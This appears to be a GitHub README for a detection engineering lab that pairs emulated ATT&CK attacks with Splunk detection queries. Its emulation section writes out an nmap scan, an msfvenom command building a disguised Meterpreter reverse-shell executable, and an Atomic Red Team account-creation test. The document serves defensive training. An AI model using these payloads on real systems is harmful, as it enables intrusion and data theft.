# Detection Engineering Lab

A hands-on detection engineering environment for developing threat detection capabilities and practicing adversary emulation mapped to the MITRE ATT&CK framework.

## Project Overview

This project simulates a realistic corporate environment to emulate adversary tradecraft and develop detection engineering skills. The infrastructure was built from scratch using **VMware Workstation Pro**, featuring a segmented network with a perimeter firewall (**pfSense**) and centralized telemetry collection via a SIEM (**Splunk**).

**Key Objectives**
- Deploy enterprise infrastructure: Domain Controller, Firewall, SIEM, and IDS sensors
- Configure high-fidelity logging with Sysmon, Zeek, and Suricata
- Execute adversary techniques mapped to MITRE ATT&CK
- Develop and document detection queries with tuning considerations

---

## Detection Summary

| Detection | MITRE ID | Data Source | Key Indicator | Status |
|:---|:---|:---|:---|:---|
| Network Port Scan | T1046 | pfSense | High-volume blocked connections | ✅ Tested |
| C2 Callback | T1059.001 | Suricata | HTTP on non-standard ports | ✅ Tested |
| Local Account Creation | T1136.001 | Windows Security | Event ID 4720 | ✅ Tested |

> **Note:** Detection queries are available in the [`/detections`](detections/) folder as `.spl` files.

---

## Logical Network Architecture

The lab features a private LAN (`192.168.1.0/24`) segmented from the internet by a firewall. All endpoint and network activity is forwarded to a central Splunk indexer for analysis.

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/0-network-diagram.png">
  <br>
  <em><b>Fig 1:</b> Logical network architecture showing LAN segmentation (192.168.1.0/24) with pfSense firewall, Splunk SIEM, and attack/target endpoints.</em>
</p>

### Lab Inventory

| Role | Hostname | OS | IP Address |
|:---|:---|:---|:---|
| **Firewall** | pfSense | FreeBSD | `192.168.1.1` |
| **SIEM** | Splunk | Ubuntu | `192.168.1.20` |
| **Identity** | ADDC01 | Windows Server 2022 | `192.168.1.10` |
| **IDS/NSM** | Zeek-Suricata | Ubuntu | `192.168.1.30` |
| **Target** | Windows-10 | Windows 10 Ent | `192.168.1.100` |
| **Attacker** | Kali | Kali Linux | `192.168.1.250` |

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/1-lab-overview.png">
  <br>
  <em><b>Fig 2:</b> VMware Workstation showing all six virtual machines running: Domain Controller, Splunk, pfSense, Zeek/Suricata, Windows 10, and Kali attacker.</em>
</p>

---

## Phase 1: Infrastructure and Segmentation

### Perimeter Firewall Configuration

Deployed **pfSense** as the network gateway, configuring firewall rules and interfaces to separate the lab environment from the home network while allowing log forwarding traffic on port 9997.

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/2-pfsense-config.png">
  <br>
  <em><b>Fig 3:</b> pfSense console displaying WAN/LAN interface configuration with IP assignments for network segmentation.</em>
</p>

### Active Directory and Endpoint Management

Promoted a Windows Server 2022 to a Domain Controller (`MYDFIR.local`) and used **Active Directory Users and Computers** to create Organizational Units (IT, Sales) and simulated user accounts. Joined a Windows 10 workstation to the domain to enforce centralized Group Policies.

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/3-ad-users.png">
  <br>
  <em><b>Fig 4:</b> Active Directory Users and Computers showing MYDFIR.local domain structure with IT and Sales organizational units.</em>
</p>

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/4-domain-join.png">
  <br>
  <em><b>Fig 5:</b> Windows 10 login screen confirming successful domain join to MYDFIR domain.</em>
</p>

---

## Phase 2: Visibility and Logging Configuration

### Endpoint Visibility (GPO and Sysmon)

Default Windows logging often misses critical context. Configured a Group Policy Object (GPO) to enable **Advanced Audit Policies** (Process Creation, Logon Events) and deployed **Sysmon** (using the Olaf Hartong configuration) to capture command-line arguments and parent process IDs.

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/5-gpo-audit.png">
  <br>
  <em><b>Fig 6:</b> Group Policy Management Editor with Advanced Audit Policy configured for Process Creation logging.</em>
</p>

### Network Security Monitoring

Deployed a Linux-based sensor running **Zeek** and **Suricata** to capture network artifacts. Configured the Splunk Universal Forwarder to ingest specific transaction logs:

- **Zeek:** Monitors `conn.log`, `dns.log`, and `http.log`
- **Suricata:** Captures IDS alerts written to `/var/log/suricata/eve.json`

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/7-linux-inputs.png">
  <br>
  <em><b>Fig 7:</b> Splunk Universal Forwarder inputs.conf on Linux sensor configured to ingest Zeek JSON logs and Suricata eve.json alerts.</em>
</p>

### Log Ingestion Pipeline

Manually configured `inputs.conf` across Windows, Linux, and FreeBSD endpoints to ensure data was correctly parsed and routed to the `mydfir-detect` index.

> **Configuration files available in:** [`/configs/splunk`](configs/splunk/)

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/6-windows-inputs.png">
  <br>
  <em><b>Fig 8:</b> Splunk Universal Forwarder inputs.conf on Windows endpoint configured to collect Security, System, Application, and Sysmon logs.</em>
</p>

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/8-pfsense-inputs.png">
  <br>
  <em><b>Fig 9:</b> Splunk Universal Forwarder inputs.conf on pfSense configured to monitor firewall filter logs.</em>
</p>

### Data Ingestion Validation

Verified that Splunk was successfully ingesting logs from all data sources: Windows endpoints, Active Directory, Zeek/Suricata network sensors, and the pfSense firewall.

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/18-zeek_suricata_splunk_ingestion.png">
  <br>
  <em><b>Fig 10:</b> Splunk search confirming log ingestion from 14 distinct sources including Suricata eve.json, Sysmon, Windows Event Logs, and Zeek connection logs.</em>
</p>

---

## Phase 3: Adversary Emulation

### Scenario 1: Network Service Discovery (T1046)

**Attack:** Used `nmap` from the Kali machine to scan the Domain Controller for open ports and services, simulating a reconnaissance phase.

```bash
nmap -A 192.168.1.0/24
```

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/10-nmap-attack.png">
  <br>
  <em><b>Fig 11:</b> Nmap aggressive scan launched from Kali targeting the 192.168.1.0/24 subnet to simulate network reconnaissance (T1046).</em>
</p>

**Detection Query:**

```spl
index="mydfir-detect" sourcetype="pfsense" action="block"
| stats count as connection_attempts by src_ip, dest_ip
| where connection_attempts > 100
| sort -connection_attempts
```

**Detection Result:** Identified a massive spike in firewall "block" events originating from the attacker's IP (`192.168.1.250`).

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/11-nmap-detect.png">
  <br>
  <em><b>Fig 12:</b> Splunk search results showing blocked connection attempts from attacker IP.</em>
</p>

**Tuning Consideration:** This query may trigger on legitimate vulnerability scanners. In production, whitelist known scanner IPs or add time-based suppression during scheduled scan windows.

---

### Scenario 2: Command and Control via Reverse Shell (T1059.001)

**Attack:** Generated a malicious payload (`invoices.docx.exe`) using **MSFVenom**. The payload was executed on the victim endpoint, establishing a reverse TCP connection (Meterpreter session) back to the C2 server.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.250 LPORT=4444 -f exe > invoices.docx.exe
```

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/12-malware-exec.png">
  <br>
  <em><b>Fig 13:</b> Victim endpoint downloading malicious payload (invoices.docx.exe) with Windows SmartScreen warning displayed.</em>
</p>

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/13-c2-session.png">
  <br>
  <em><b>Fig 14:</b> Metasploit console showing successful Meterpreter session established from attacker (192.168.1.250) to victim (192.168.1.100).</em>
</p>

**Post-Exploitation Activity:** After establishing the C2 session, demonstrated data exfiltration by downloading files from the compromised endpoint back to the attacker machine.

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/17-windows_computer_exploited.png">
  <br>
  <em><b>Fig 15:</b> Meterpreter session listing victim's Downloads folder and exfiltrating sysmon.zip (4.64 MB) to the attacker machine.</em>
</p>

**Detection Query:**

```spl
index="mydfir-detect" sourcetype="suricata" event_type="http"
| where NOT (dest_port=80 OR dest_port=443)
| stats count by src_ip, dest_ip, dest_port
| where count > 5
```

**Detection Result:** The **Suricata** IDS detected the anomalous traffic pattern and forwarded an alert to Splunk, flagging the potential C2 activity on port 8000.

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/14-c2-detect.png">
  <br>
  <em><b>Fig 16:</b> Splunk displaying Suricata events capturing HTTP C2 traffic between victim and attacker on port 8000.</em>
</p>

**Investigation Pivot:** After identifying the C2 callback, pivot to Sysmon Event ID 1 to identify the parent process:

```spl
index="mydfir-detect" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search Image="*invoices.docx.exe*"
| table _time, ComputerName, User, ParentImage, Image, CommandLine
```

---

### Scenario 3: Local Account Creation (T1136.001)

**Attack:** Using the **Atomic Red Team** framework, executed a script to programmatically create a local admin account ("NewLocalUser") on the target machine. This emulates the **Persistence** tactic defined by MITRE ATT&CK.

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/19-attack_mitre_technique_T1136.png">
  <br>
  <em><b>Fig 17:</b> MITRE ATT&CK framework showing T1136.001 (Local Account Creation) detection strategy, serving as the basis for this detection logic.</em>
</p>

```powershell
Invoke-AtomicTest T1136.001
```

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/15-atomic-attack.png">
  <br>
  <em><b>Fig 18:</b> Atomic Red Team executing T1136.001 test creating local admin account "NewLocalUser" for persistence simulation.</em>
</p>

**Detection Query:**

```spl
index="mydfir-detect" sourcetype="WinEventLog:Security" EventCode=4720
| table _time, ComputerName, TargetUserName, SubjectUserName, SubjectDomainName
| sort -_time
```

**Detection Result:** Event ID 4720 captured the exact time of account creation and the responsible user account, confirming the persistence attempt.

<p align="center">
  <img src="https://github.com/chalithah/detection-engineering-lab/blob/main/images/16-atomic-detect.png">
  <br>
  <em><b>Fig 19:</b> Splunk search detecting "NewLocalUser" account creation event.</em>
</p>

**Investigation Pivot:** Check what the new account did after creation:

```spl
index="mydfir-detect" sourcetype="WinEventLog:Security" EventCode=4624 TargetUserName="NewLocalUser"
| table _time, ComputerName, LogonType, IpAddress
```

**Tuning Consideration:** This detection will fire for legitimate IT account provisioning. In production, correlate with change management tickets or whitelist known admin workstations.

---

## Lessons Learned

**Log Parsing:** Raw logs from pfSense and Zeek required specific source type configurations (`sourcetype=pfsense`, `sourcetype=bro:json`) to be properly indexed and searchable in Splunk.

**FreeBSD Compatibility:** The standard Linux Splunk Forwarder is incompatible with the FreeBSD kernel in pfSense 2.7. Resolved by downgrading to pfSense 2.6 to ensure stable log forwarding.

**The Power of Sysmon:** Without Sysmon Event ID 1 (Process Creation), investigating the `invoices.docx.exe` malware would have lacked critical context like the parent process ID and command line arguments.

**Detection vs. Alert:** Running ad-hoc queries is different from operationalizing detections. Next iteration will include saved searches with threshold-based alerting.

---

## Repository Structure

```
detection-engineering-lab/
├── README.md
├── images/
│   ├── 0-network-diagram.png
│   ├── 1-lab-overview.png
│   └── ... (screenshots)
├── detections/
│   ├── T1046-network-scan.spl
│   ├── T1059.001-c2-callback.spl
│   └── T1136.001-local-account-creation.spl
└── configs/
    └── splunk/
        ├── inputs-windows.conf
        ├── inputs-linux.conf
        └── inputs-pfsense.conf
```

---
